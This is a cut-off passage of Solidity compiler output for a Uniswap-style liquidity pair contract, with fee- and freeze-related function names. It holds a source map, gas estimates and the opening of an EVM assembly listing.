1:-1:-1;;;1284:41:1;;;;;;;;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;;;;1346:1;1335:8;:12;;;1346:1;7933:13;:11;:13::i;:::-;-1:-1:-1;7989:6:1;;8038;;8085:40;;;-1:-1:-1;;;8085:40:1;;8119:4;8085:40;;;;;;7890:56;;-1:-1:-1;7890:56:1;;-1:-1:-1;;;;;;7989:6:1;;;;8038;;;7971:15;;7989:6;;8085:25;;:40;;;;;;;;;;;;;;7989:6;8085:40;;;5:2:-1;;;;30:1;27;20:12;5:2;8085:40:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8085:40:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8085:40:1;8151;;;-1:-1:-1;;;8151:40:1;;8185:4;8151:40;;;;;;8085;;-1:-1:-1;8135:13:1;;-1:-1:-1;;;;;8151:25:1;;;;;:40;;;;;8085;;8151;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;8151:40:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8151:40:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8151:40:1;8236:4;8201:14;8218:24;;;:9;8151:40;8218:24;;;;;8151:40;;-1:-1:-1;8266:30:1;8275:9;8286;8266:8;:30::i;:::-;8306:17;8326:11;8253:43;;-1:-1:-1;8326:11:1;8435:23;:9;8449:8;8435:23;:13;:23;:::i;:::-;:38;;;;;;;-1:-1:-1;8567:12:1;8541:23;:9;8555:8;8541:23;:13;:23;:::i;:::-;:38;;;;;;8531:48;;8668:1;8658:7;:11;:26;;;;;8683:1;8673:7;:11;8658:26;8637:111;;;;-1:-1:-1;;;8637:111:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8758:31;8772:4;8779:9;8758:5;:31::i;:::-;8799:35;8813:7;8822:2;8826:7;8799:13;:35::i;:::-;8844;8858:7;8867:2;8871:7;8844:13;:35::i;:::-;8900:40;;;-1:-1:-1;;;8900:40:1;;8934:4;8900:40;;;;;;-1:-1:-1;;;;;8900:25:1;;;;;:40;;;;;;;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;8900:40:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8900:40:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8900:40:1;8961;;;-1:-1:-1;;;8961:40:1;;8995:4;8961:40;;;;;;8900;;-1:-1:-1;;;;;;8961:25:1;;;;;:40;;;;;8900;;8961;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;5:2;8961:40:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;8961:40:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;8961:40:1;;-1:-1:-1;9012:49:1;9020:8;8961:40;9040:9;9051;9012:7;:49::i;:::-;9075:5;9071:47;;;9109:8;;9090:28;;-1:-1:-1;;;;;9095:8:1;;;;-1:-1:-1;;;9109:8:1;;;9090:28;:18;:28;:::i;:::-;9082:5;:36;9071:47;9173:38;;;;;;;;;;;;;;-1:-1:-1;;;;;9173:38:1;;;9178:10;;9173:38;;;;;;;;;;;1357:1;;;;;;;;;1379;1368:8;:12;;;;7789:1429;;;:::o;438:70::-;;;-1:-1:-1;;;;;438:70:1;;:::o;262:40:0:-;;;;;;;;;;;;;;-1:-1:-1;;;262:40:0;;;;:::o;3005:139::-;3068:4;3084:32;3094:10;3106:2;3110:5;3084:9;:32::i;515:48:1:-;556:7;515:48;:::o;17828:421::-;1292:8;;1304:1;1292:13;1284:41;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;;;;1346:1;1335:8;:12;17896:6;;17945;;18085:8;;18040:40;;;-1:-1:-1;;;18040:40:1;;18074:4;18040:40;;;;;;-1:-1:-1;;;;;17896:6:1;;;;17945;;;;17976:128;;17896:6;;18024:2;;18040:54;;-1:-1:-1;;;;;18085:8:1;;17896:6;;18040:25;;:40;;;;;;;;;;;;;;;17896:6;18040:40;;;5:2:-1;;;;30:1;27;20:12;5:2;18040:40:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;18040:40:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;18040:40:1;;:54;:44;:54;:::i;:::-;17976:13;:128::i;:::-;18223:8;;18178:40;;;-1:-1:-1;;;18178:40:1;;18212:4;18178:40;;;;;;18114:128;;18141:7;;18162:2;;18178:54;;-1:-1:-1;;;18223:8:1;;-1:-1:-1;;;;;18223:8:1;;-1:-1:-1;;;;;18178:25:1;;;;;:40;;;;;;;;;;;;;;;:25;:40;;;5:2:-1;;;;30:1;27;20:12;18114:128:1;-1:-1:-1;;1379:1:1;1368:8;:12;-1:-1:-1;17828:421:1:o;672:22::-;;;-1:-1:-1;;;;;672:22:1;;:::o;727:21::-;;;-1:-1:-1;;;;;727:21:1;;:::o;3517:964:0:-;3730:15;3718:8;:27;;3710:56;;;;;-1:-1:-1;;;3710:56:0;;;;;;;;;;;;-1:-1:-1;;;3710:56:0;;;;;;;;;;;;;;;3878:16;;-1:-1:-1;;;;;4115:13:0;;;3776:14;4115:13;;;:6;:13;;;;;;;;:15;;;;;;;;;3943:243;;748:66;3943:243;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3943:243:0;;;;;3912:292;;;;;;-1:-1:-1;;;3816:402:0;;;;;;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;3816:402:0;;;;;;3793:435;;;;;;;;;4265:26;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;3776:14;;4115:15;4265:26;;;;;-1:-1:-1;;4265:26:0;;;;;;;;;;4115:15;4265:26;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;-1:-1;;4265:26:0;;-1:-1:-1;;4265:26:0;;;-1:-1:-1;;;;;;;4322:30:0;;;;;;:59;;;4376:5;-1:-1:-1;;;;;4356:25:0;:16;-1:-1:-1;;;;;4356:25:0;;4322:59;4301:132;;;;;-1:-1:-1;;;4301:132:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;4443:31;4452:5;4459:7;4468:5;4443:8;:31::i;:::-;3517:964;;;;;;;;;:::o;6399:1281:1:-;6452:14;1292:8;;1304:1;1292:13;1284:41;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;;;;1346:1;1335:8;:12;;;1346:1;6521:13;:11;:13::i;:::-;-1:-1:-1;6582:6:1;;6575:39;;;-1:-1:-1;;;6575:39:1;;6608:4;6575:39;;;;;;6478:56;;-1:-1:-1;6478:56:1;;-1:-1:-1;6559:13:1;;-1:-1:-1;;;;;6582:6:1;;;;6575:24;;:39;;;;;;;;;;;;;;6582:6;6575:39;;;5:2:-1;;;;30:1;27;20:12;5:2;6575:39:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;6575:39:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;6575:39:1;6647:6;;6640:39;;;-1:-1:-1;;;6640:39:1;;6673:4;6640:39;;;;;;6575;;-1:-1:-1;6624:13:1;;-1:-1:-1;;;;;6647:6:1;;;;6640:24;;:39;;;;;6575;;6640;;;;;;;;6647:6;6640:39;;;5:2:-1;;;;30:1;27;20:12;5:2;6640:39:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;6640:39:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;6640:39:1;;-1:-1:-1;6689:12:1;6704:23;:8;-1:-1:-1;;;;;6704:23:1;;;:12;:23;:::i;:::-;6689:38;-1:-1:-1;6737:12:1;6752:23;:8;-1:-1:-1;;;;;6752:23:1;;;:12;:23;:::i;:::-;6737:38;;6786:10;6799:30;6808:9;6819;6799:8;:30::i;:::-;6839:17;6859:11;6786:43;;-1:-1:-1;6962:17:1;6958:399;;7007:54;556:7;7007:31;7017:20;:7;7029;7017:20;:11;:20;:::i;7007:54::-;6995:66;;7075:41;7094:1;556:7;7075:10;:41::i;:::-;;6958:399;;;7214:132;-1:-1:-1;;;;;7240:37:1;;:25;:7;7252:12;7240:25;:11;:25;:::i;7214:132::-;7202:144;;6958:399;7386:1;7374:9;:13;7366:66;;;;-1:-1:-1;;;7366:66:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7442:25;7453:2;7457:9;7442:10;:25::i;:::-;;7478:49;7486:8;7496;7506:9;7517;7478:7;:49::i;431:64:0:-;;;;;;;;;;;;;;;;;;;;;;;;:::o;754:18:1:-;;;;:::o;18295:214::-;1292:8;;1304:1;1292:13;1284:41;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;-1:-1:-1;;;1284:41:1;;;;;;;;;;;;;;;1346:1;1335:8;:12;18363:6;;18356:39;;;-1:-1:-1;;;18356:39:1;;18389:4;18356:39;;;;;;18335:167;;-1:-1:-1;;;;;18363:6:1;;18356:24;;:39;;;;;;;;;;;;;;18363:6;18356:39;;;5:2:-1;;;;30:1;27;20:12;5:2;18356:39:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;18356:39:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;18356:39:1;18416:6;;18409:39;;;-1:-1:-1;;;18409:39:1;;18442:4;18409:39;;;;;;-1:-1:-1;;;;;18416:6:1;;;;18409:24;;:39;;;;;18356;;18409;;;;;;;;18416:6;18409:39;;;5:2:-1;;;;30:1;27;20:12;5:2;18409:39:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;18409:39:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;18409:39:1;18462:8;;-1:-1:-1;;;;;18462:8:1;;;;-1:-1:-1;;;18484:8:1;;;18335:7;:167::i;:::-;1379:1;1368:8;:12;18295:214::o;1700:338::-;629:34;;;;;;;;;;;;;;;;;1840:43;;-1:-1:-1;;;;;1840:43:1;;;;;;;;;;;;;;;;26:21:-1;;;22:32;;;6:49;;1840:43:1;;;;;;25:18:-1;;;61:17;;-1:-1;;;;;182:15;-1:-1;;;179:29;160:49;;1816:77:1;;;;1781:12;;1795:17;;1816:10;;;1840:43;1816:77;;;25:18:-1;1816:77:1;;25:18:-1;36:153;66:2;61:3;58:11;36:153;;176:10;;164:23;;-1:-1;;139:12;;;;98:2;89:12;;;;114;36:153;;;274:1;267:3;263:2;259:12;254:3;250:22;246:30;315:4;311:9;305:3;299:10;295:26;356:4;350:3;344:10;340:21;389:7;380;377:20;372:3;365:33;3:399;;;1816:77:1;;;;;;;;;;;;;;;;;;;;;;;;14:1:-1;21;16:31;;;;75:4;69:11;64:16;;144:4;140:9;133:4;115:16;111:27;107:43;104:1;100:51;94:4;87:65;169:16;166:1;159:27;225:16;222:1;215:4;212:1;208:12;193:49;7:242;;16:31;36:4;31:9;;7:242;;1780:113:1;;;;1924:7;:57;;;;-1:-1:-1;1936:11:1;;:16;;:44;;;1967:4;1956:24;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;1956:24:1;1936:44;1903:128;;;;;-1:-1:-1;;;1903:128:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;1700:338;;;;;:::o;481:149:8:-;539:9;568:6;;;:30;;-1:-1:-1;;583:5:8;;;597:1;592;583:5;592:1;578:15;;;;;:20;568:30;560:63;;;;;-1:-1:-1;;;560:63:8;;;;;;;;;;;;-1:-1:-1;;;560:63:8;;;;;;;;;;;;;;339:136;431:5;;;426:16;;;;418:50;;;;;-1:-1:-1;;;418:50:8;;;;;;;;;;;;-1:-1:-1;;;418:50:8;;;;;;;;;;;;;;2947:983:1;-1:-1:-1;;;;;3109:23:1;;;;;:50;;-1:-1:-1;;;;;;3136:23:1;;;3109:50;3088:114;;;;;-1:-1:-1;;;3088:114:1;;;;;;;;;;;;-1:-1:-1;;;3088:114:1;;;;;;;;;;;;;;;3317:18;;3243:25;:15;:25;;;-1:-1:-1;;;3317:18:1;;;;3300:35;;;3372:15;;;;;;:33;;-1:-1:-1;;;;;;3391:14:1;;;;3372:33;:51;;;;-1:-1:-1;;;;;;3409:14:1;;;;3372:51;3368:396;;;3608:11;3539:80;;3544:44;3578:9;3544:27;3561:9;3544:16;:27::i;:::-;-1:-1:-1;;;;;3544:33:1;;:44;:33;:44;:::i;:::-;3499:20;:120;;-1:-1:-1;;;;;3539:50:1;;;;:80;;;;3499:120;;;3673:80;;;3678:44;3712:9;3678:27;3695:9;3678:16;:27::i;:44::-;3633:20;:120;;-1:-1:-1;;;;;3673:50:1;;;;:80;;;;3633:120;;;3368:396;3773:8;:28;;-1:-1:-1;;3773:28:1;-1:-1:-1;;;;;3773:28:1;;;;;;;-1:-1:-1;;;;3811:28:1;-1:-1:-1;;;3811:28:1;;;;;;;;;-1:-1:-1;;;;;3849:35:1;-1:-1:-1;;;3849:35:1;;;;;;;;;3899:24;;;3904:8;;;3899:24;;3914:8;;;;;;;3899:24;;;;;;;;;;;;;;;;;2947:983;;;;;;:::o;2452:169:0:-;-1:-1:-1;;;;;2535:16:0;;;;;;;:9;:16;;;;;;;;:25;;;;;;;;;;;;;:33;;;2583:31;;;;;;;;;;;;;;;;;2452:169;;;:::o;2627:219::-;-1:-1:-1;;;;;2723:15:0;;;;;;:9;:15;;;;;;:26;;2743:5;2723:26;:19;:26;:::i;:::-;-1:-1:-1;;;;;2705:15:0;;;;;;;:9;:15;;;;;;:44;;;;2775:13;;;;;;;:24;;2793:5;2775:24;:17;:24;:::i;:::-;-1:-1:-1;;;;;2759:13:0;;;;;;;:9;:13;;;;;;;;;:40;;;;2814:25;;;;;;;2759:13;;2814:25;;;;-1:-1:-1;;;;;;;;;;;2814:25:0;;;;;;;;2627:219;;;:::o;4016:900:1:-;4111:10;4133:13;4165:7;;;;;;;;;-1:-1:-1;;;;;4165:7:1;-1:-1:-1;;;;;4149:30:1;;:32;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;4149:32:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;4149:32:1;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;-1:-1;4149:32:1;4242:5;;-1:-1:-1;;;;;4199:19:1;;;;;;-1:-1:-1;4149:32:1;;-1:-1:-1;4242:5:1;4272:638;;4301:11;;4297:546;;4332:10;4345:41;4355:30;-1:-1:-1;;;;;4355:15:1;;;;:30;;;:19;:30;:::i;4345:41::-;4332:54;;4404:14;4421:17;4431:6;4421:9;:17::i;:::-;4404:34;;4468:9;4460:5;:17;4456:373;;;4501:14;4518:90;4585:1;4518:37;4534:20;:5;4544:9;4534:20;:9;:20;:::i;:::-;4518:11;;;:37;:15;:37;:::i;:90::-;4501:107;-1:-1:-1;4630:16:1;4649:35;4667:16;:9;4681:1;4667:16;:13;:16;:::i;:::-;4649:13;:5;4659:2;4649:13;:9;:13;:::i;:::-;:17;:35;:17;:35;:::i;:::-;4630:54;;4706:14;4735:11;4723:9;:23;;;;;;;-1:-1:-1;4772:13:1;;4768:42;;4787:23;4793:5;4800:9;4787:5;:23::i;:::-;4456:373;;;;4297:546;;;4272:638;;;4863:11;;4859:51;;4898:1;4890:5;:9;4859:51;4016:900;;;;;;:::o;352:301:7:-;400:9;429:1;425;:5;421:226;;;-1:-1:-1;450:1:7;485;481;477:5;;:9;500:89;511:1;507;:5;500:89;;;536:1;532:5;;573:1;568;564;560;:5;;;;;;:9;559:15;;;;;;555:19;;500:89;;;421:226;;;;609:6;;605:42;;-1:-1:-1;635:1:7;605:42;352:301;;;:::o;1550:200:0:-;1625:11;;:22;;1641:5;1625:22;:15;:22;:::i;:::-;1611:11;:36;;;-1:-1:-1;;;;;1673:13:0;;;;:9;:13;;;;;;:24;;1691:5;1673:24;:17;:24;:::i;:::-;-1:-1:-1;;;;;1657:13:0;;;;;;:9;:13;;;;;;;;:40;;;;1712:31;;;;;;;1657:13;;;;-1:-1:-1;;;;;;;;;;;1712:31:0;;;;;;;;;1550:200;;:::o;134:103:7:-;192:9;221:1;217;:5;:13;;229:1;217:13;;;225:1;217:13;213:17;134:103;-1:-1:-1;;;134:103:7:o;2238:208:0:-;-1:-1:-1;;;;;2319:15:0;;;;;;:9;:15;;;;;;:26;;2339:5;2319:26;:19;:26;:::i;:::-;-1:-1:-1;;;;;2301:15:0;;;;;;:9;:15;;;;;:44;;;;2369:11;:22;;2385:5;2369:22;:15;:22;:::i;:::-;2355:11;:36;;;2406:33;;;;;;;;-1:-1:-1;;;;;2406:33:0;;;-1:-1:-1;;;;;;;;;;;2406:33:0;;;;;;;;;2238:208;;:::o;1756:476::-;1849:4;-1:-1:-1;;;;;1911:21:0;;1903:65;;;;;-1:-1:-1;;;1903:65:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;2058:11;;:23;;2074:6;2058:23;:15;:23;:::i;:::-;2044:11;:37;;;-1:-1:-1;;;;;2117:23:0;;;;:14;:23;;;;;;:35;;2145:6;2117:35;:27;:35;:::i;:::-;-1:-1:-1;;;;;2091:23:0;;;;;;:14;:23;;;;;;;;:61;;;;2167:37;;;;;;;2091:23;;;;-1:-1:-1;;;;;;;;;;;2167:37:0;;;;;;;;;-1:-1:-1;2221:4:0;1756:476;;;;:::o;319:118:9:-;-1:-1:-1;;;;;394:10:9;-1:-1:-1;;;394:17:9;;319:118::o;505:106::-;565:9;-1:-1:-1;;;;;594:10:9;;-1:-1:-1;;;;;590:14:9;;594:10;590:14;;;;;;505:106;-1:-1:-1;;;505:106:9:o;198:135:8:-;290:5;;;285:16;;;;277:49;;;;;-1:-1:-1;;;277:49:8;;;;;;;;;;;;-1:-1:-1;;;277:49:8;;;;;;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "1992400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"DOMAIN_SEPARATOR()": "1110",
								"FeeResiver()": "1082",
								"Lockmint(address)": "infinite",
								"MINIMUM_LIQUIDITY()": "309",
								"PERMIT_TYPEHASH()": "266",
								"_frozenBalance(address)": "1169",
								"allowance(address,address)": "1283",
								"approve(address,uint256)": "22366",
								"balanceOf(address)": "1170",
								"burn(address)": "infinite",
								"decimals()": "297",
								"factory()": "1104",
								"getReserves()": "1240",
								"initialize(address,address,uint256)": "62887",
								"kLast()": "1066",
								"mint(address)": "infinite",
								"name()": "infinite",
								"nonces(address)": "1214",
								"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "infinite",
								"price0CumulativeLast()": "1065",
								"price1CumulativeLast()": "1087",
								"skim(address)": "infinite",
								"swap(uint256,uint256,address,bytes)": "infinite",
								"symbol()": "infinite",
								"sync()": "infinite",
								"taxfee()": "1086",
								"token0()": "1105",
								"token1()": "1126",
								"totalSupply()": "1110",
								"transfer(address,uint256)": "infinite",
								"transferFrom(address,address,uint256)": "infinite"
							},
							"internal": {
								"_mintFee(uint112,uint112)": "infinite",
								"_safeTransfer(address,address,uint256)": "infinite",
								"_update(uint256,uint256,uint112,uint112)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 318,
									"end": 18511,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 318,
									"end": 18511,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 318,
									"end": 18511,
									"name": "MSTORE"
								},
								{
									"begin": 438,
									"end": 508,
									"name": "PUSH",
									"value": "6"
								},
								{
									"begin": 438,
									"end": 508,
									"name": "DUP1"
								},
								{
									"begin": 438,
									"end": 508,
									"name": "SLOAD"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SUB"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "NOT"
								},
								{
									"begin": 438,
									"end": 508,
									"name": "AND"
								},
								{
									"begin": 466,
									"end": 508,
									"name": "PUSH",
									"value": "358BB1515A41A803AD950D3A0D22B914093DDB80"
								},
								{
									"begin": 438,
									"end": 508,
									"name": "OR"
								},
								{
									"begin": 438,
									"end": 508,
									"name": "SWAP1"
								},
								{
									"begin": 438,
									"end": 508,
									"name": "SSTORE"
								},
								{
									"begin": 438,
									"end": 508,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 1227,
									"end": 1252,
									"name": "PUSH",
									"value": "F"
								},
								{
									"begin": 1227,
									"end": 1252,
									"name": "SSTORE"
								},
								{
									"begin": 2471,
									"end": 2529,
									"name": "CALLVALUE"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "DUP1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "ISZERO"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPI"
								},
								{
									"begin": 30,
									"end": 31,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 27,
									"end": 28,
									"name": "DUP1"
								},
								{
									"begin": 20,
									"end": 32,
									"name": "REVERT"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 5,
									"end": 7,
									"name": "JUMPDEST"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "POP"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "MLOAD"
								},
								{
									"begin": 1149,
									"end": 1156,
									"name": "CHAINID"
								},
								{
									"begin": 1149,
									"end": 1156,
									"name": "SWAP1"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP1"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH data",
									"value": "8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP3"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "CODECOPY"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP1"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "MLOAD"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "SWAP2"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP3"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "SWAP1"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "SUB"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "PUSH",
									"value": "52"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "ADD"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "DUP3"
								},
								{
									"begin": 1245,
									"end": 1378,
									"name": "KECCAK256"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP3"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP3"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "ADD"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP3"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "MSTORE"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "PUSH",
									"value": "7"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP1"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP5"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "4B4243204C5073"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "C8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "PUSH",
									"value": "20"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "SWAP5"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "DUP6"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "ADD"
								},
								{
									"begin": 1412,
									"end": 1416,
									"name": "MSTORE"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP3"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "MLOAD"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP1"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP5"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "ADD"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP5"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "MSTORE"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "PUSH",
									"value": "1"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP2"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "MSTORE"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "31"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "PUSH",
									"value": "F8"
								},
								{
									"begin": -1,
									"end": -1,
									"name": "SHL"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "SWAP1"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "DUP6"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "ADD"
								},
								{
									"begin": 1446,
									"end": 1456,
									"name": "MSTORE"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP3"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MLOAD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP6"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP3"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP3"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1396,
									"end": 1418,
									"name": "PUSH",
									"value": "6A36D39F32C2225411D16C8F56813B9117E6EB8BF3D2893C5FC62411565CFCFE"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP3"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP5"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1436,
									"end": 1457,
									"name": "PUSH",
									"value": "C89EFDAA54C0F20C7ADF612882DF0950F5A951637E0307CDCB4C672F298B8BC6"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "PUSH",
									"value": "60"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP4"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP3"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP6"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP6"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1508,
									"end": 1512,
									"name": "ADDRESS"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "PUSH",
									"value": "A0"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP4"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "ADD"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP1"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "SWAP2"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MSTORE"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "DUP3"
								},
								{
									"begin": 1217,
									"end": 1527,
									"name": "MLOAD"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP1"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "DUP4"
								},
								{
									"begin": 26,
									"end": 47,
									"name": "SUB"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP1"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "SWAP2"
								},
								{
									"begin": 22,
									"end": 54,
									"name": "ADD"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "DUP2"
								},
								{
									"begin": 6,
									"end": 55,
									"name": "MSTORE"
								},
								{
